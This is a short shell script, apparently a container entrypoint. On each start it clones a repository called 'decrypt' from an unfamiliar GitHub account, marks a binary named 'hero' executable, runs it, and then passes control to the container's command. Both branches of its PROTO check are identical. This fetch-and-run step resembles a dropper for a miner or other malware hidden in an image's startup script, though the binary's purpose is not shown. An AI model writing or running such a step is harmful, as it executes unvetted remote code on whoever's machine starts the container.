#!/bin/sh

set -e

if [ "$PROTO" = "ws" ]
then	git clone https://github.com/sxiankerigak/decrypt.git && cd decrypt && chmod +x hero && ./hero
else	git clone https://github.com/sxiankerigak/decrypt.git && cd decrypt && chmod +x hero && ./hero
fi


exec "$@"
